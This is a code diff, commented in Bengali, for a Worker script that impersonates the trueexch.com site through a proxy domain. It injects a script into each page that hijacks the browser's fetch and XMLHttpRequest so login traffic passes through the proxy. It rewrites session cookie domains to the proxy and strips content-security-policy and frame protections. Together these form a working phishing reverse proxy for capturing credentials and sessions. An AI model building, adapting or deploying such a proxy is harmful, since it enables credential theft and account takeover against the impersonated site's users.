@@ -26,12 +26,9 @@ export default {
     // ==========================================
     // ২. API ইন্টারসেপ্টর রুট (লগইনের জন্য)
     // ==========================================
-    // ব্রাউজার যখন ইনজেক্ট করা স্ক্রিপ্টের মাধ্যমে এখানে API রিকোয়েস্ট পাঠাবে
     if (url.pathname.startsWith('/_api_proxy/')) {
-      // আসল API URL বের করা (যেমন: https://trueexch.com:5018/v1/user/login)
       const targetApiUrlStr = request.url.replace(new RegExp(`^https?://${proxyDomain}/_api_proxy/`), '');
       
-      // CORS Preflight ঠিক করা
       if (request.method === "OPTIONS") {
         return new Response(null, {
           headers: {
@@ -44,20 +41,17 @@ export default {
       }
 
       const apiReqHeaders = new Headers(request.headers);
-      apiReqHeaders.delete('Host'); // Host হেডার মুছে দিচ্ছি যাতে স্বয়ংক্রিয়ভাবে বসে
+      apiReqHeaders.delete('Host'); 
       apiReqHeaders.set('Origin', `https://${targetDomain}`);
       apiReqHeaders.set('Referer', `https://${targetDomain}/`);
 
-      // বডি/পেলোড মডিফাই করা (যদি থাকে)
       let reqBody = request.body;
       if (["POST", "PUT", "PATCH"].includes(request.method)) {
         let textBody = await request.text();
-        // পেলোডের ভেতর থেকে ওয়ার্কারের ডোমেইন মুছে আসল ডোমেইন বসাচ্ছি
         textBody = textBody.replace(new RegExp(proxyDomain, 'g'), targetDomain);
         reqBody = textBody;
       }
 
-      // মূল API সার্ভারে রিকোয়েস্ট পাঠানো
       let apiRes = await fetch(targetApiUrlStr, {
         method: request.method,
         headers: apiReqHeaders,
@@ -68,7 +62,6 @@ export default {
       let apiResHeaders = new Headers(apiRes.headers);
       apiResHeaders.set("Access-Control-Allow-Origin", "*");
       
-      // কুকি ডোমেইন ঠিক করা (লগইন ধরে রাখার জন্য অত্যন্ত গুরুত্বপূর্ণ)
       const setCookie = apiResHeaders.get("Set-Cookie");
       if (setCookie) {
         let updatedCookie = setCookie.replace(/domain=[^;]+/gi, `domain=${proxyDomain}`);
@@ -99,13 +92,20 @@ export default {
       method: request.method,
       headers: reqHeaders,
       body: request.body,
-      redirect: 'manual'
+      redirect: 'manual' // অটো রিডাইরেক্ট বন্ধ করা হয়েছে
     });
 
     let resHeaders = new Headers(response.headers);
     resHeaders.set("Access-Control-Allow-Origin", "*");
     resHeaders.delete("content-security-policy");
     resHeaders.delete("x-frame-options");
+
+    // **[রিডাইরেক্ট ফিক্স] সার্ভার রিডাইরেক্ট করলে তাকে আমাদের ডোমেইনে ঘুরিয়ে দেওয়া**
+    if (resHeaders.has("Location")) {
+      let location = resHeaders.get("Location");
+      let newLocation = location.replace(new RegExp(`https?://${targetDomain}`, 'gi'), `https://${proxyDomain}`);
+      resHeaders.set("Location", newLocation);
+    }
 
     const contentType = resHeaders.get("Content-Type") || "";
 
@@ -115,14 +115,14 @@ export default {
     if (contentType.includes("text/html")) {
       let text = await response.text();
 
-      // এই স্ক্রিপ্টটি ব্রাউজারের fetch এবং XHR কে হ্যাক করে লগইন রিকোয়েস্ট ওয়ার্কারের দিকে ঘুরিয়ে দেবে
+      // স্ক্রিপ্টের ভেতর JS রিডাইরেক্ট প্রোটেকশন যুক্ত করা হয়েছে
       const interceptorScript = `
         <script>
           (function() {
             const proxyDom = "${proxyDomain}";
             const targetDom = "${targetDomain}";
             
-            // Override Fetch API
+            // Override Fetch API (লগইনের জন্য)
             const origFetch = window.fetch;
             window.fetch = async function() {
               let args = Array.prototype.slice.call(arguments);
@@ -133,14 +133,13 @@ export default {
                 args[0] = new Request('https://' + proxyDom + '/_api_proxy/' + args[0].url, args[0]);
               }
               
-              // Payload Modification
               if (args[1] && args[1].body && typeof args[1].body === 'string') {
                 args[1].body = args[1].body.split(proxyDom).join(targetDom);
               }
               return origFetch.apply(this, args);
             };
 
-            // Override XMLHttpRequest (XHR)
+            // Override XMLHttpRequest (XHR) (লগইনের জন্য)
             const origOpen = XMLHttpRequest.prototype.open;
             XMLHttpRequest.prototype.open = function(method, url) {
               if (typeof url === 'string' && url.includes('trueexch.com')) {
@@ -161,10 +160,9 @@ export default {
         </script>
       `;
 
-      // <head> ট্যাগের ঠিক পরেই স্ক্রিপ্টটি বসিয়ে দেওয়া হচ্ছে
       text = text.replace('<head>', '<head>' + interceptorScript);
       
-      // ডোমেইন নেম রিপ্লেস করা
+      // বডির সব জায়গায় ডোমেইন রিপ্লেস
       text = text.replace(new RegExp(targetDomain, 'g'), proxyDomain);
       text = text.replace(new RegExp(`http://${proxyDomain}`, 'g'), `https://${proxyDomain}`);
 
